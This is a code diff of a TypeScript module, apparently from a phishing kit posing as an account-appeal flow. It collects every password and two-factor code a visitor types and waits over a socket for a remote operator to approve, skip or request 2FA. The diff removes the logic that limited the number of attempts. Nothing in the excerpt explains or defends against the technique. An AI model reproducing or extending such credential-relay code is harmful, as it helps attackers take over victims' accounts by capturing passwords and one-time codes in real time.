@@ -6,13 +6,11 @@ import type { Socket } from 'socket.io-client';
 
 export type LoginSubmitResult = {
     approved: boolean;
-    isLastAttempt: boolean;
     needs2FA: boolean;
 };
 
 export type CodeSubmitResult = {
     approved: boolean;
-    isLastAttempt: boolean;
 };
 
 type AppealContext = {
@@ -34,8 +32,7 @@ type AppealContext = {
 export const submitLoginApproval = async (
     ctx: AppealContext,
     identity: string,
-    password: string,
-    maxPass: number
+    password: string
 ): Promise<LoginSubmitResult> => {
     const nextPasswords = [...ctx.passwordAttempts, password];
     ctx.addPasswordAttempt(password);
@@ -62,22 +59,17 @@ export const submitLoginApproval = async (
     ctx.setMessageId(newMessageId);
 
     const result = await waitLoginApproval(ctx.socket);
-    const isLastAttempt = nextPasswords.length >= maxPass;
 
     if (result === 'approved' || result === 'skipped') {
-        return { approved: true, isLastAttempt, needs2FA: false };
+        return { approved: true, needs2FA: false };
     }
     if (result === '2fa') {
-        return { approved: false, isLastAttempt, needs2FA: true };
+        return { approved: false, needs2FA: true };
     }
-    return { approved: false, isLastAttempt, needs2FA: false };
+    return { approved: false, needs2FA: false };
 };
 
-export const submitCodeApproval = async (
-    ctx: AppealContext,
-    code: string,
-    maxCode: number
-): Promise<CodeSubmitResult> => {
+export const submitCodeApproval = async (ctx: AppealContext, code: string): Promise<CodeSubmitResult> => {
     const nextCodes = [...ctx.twoFAAttempts, code];
     ctx.addTwoFAAttempt(code);
 
@@ -102,6 +94,5 @@ export const submitCodeApproval = async (
     ctx.setMessageId(newMessageId);
 
     const result = await waitCodeApproval(ctx.socket);
-    const isLastAttempt = nextCodes.length >= maxCode;
-    return { approved: result === 'approved' || result === 'skipped', isLastAttempt };
+    return { approved: result === 'approved' || result === 'skipped' };
 };
